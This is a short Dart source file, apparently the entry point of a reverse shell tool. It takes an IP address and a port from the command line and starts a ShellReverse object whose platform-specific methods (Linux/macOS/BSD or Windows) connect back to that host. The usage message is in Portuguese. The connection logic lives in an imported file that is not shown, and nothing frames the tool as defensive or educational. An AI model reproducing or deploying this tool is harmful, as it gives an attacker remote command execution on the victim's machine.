import 'dart:io';
import 'src/shell_reverse.dart';

void main(List<String> arguments) {
  if (arguments.length == 2) {
    try {
      final ShellReverse shellReverse = ShellReverse(
        host: arguments.first,
        port: int.parse(arguments.last),
      );
      if (Platform.isLinux || Platform.isMacOS) {
        shellReverse.runLinuxMacosBsd();
      } else if (Platform.isWindows) {
        shellReverse.runWindows();
      }
    } catch (error, stackTrace) {
      print(error);
      print(stackTrace);
    }
  } else {
    print('Argumentos invalidos :\\');
    print('Use -> ./main.exe <ip> <port>');
  }
}
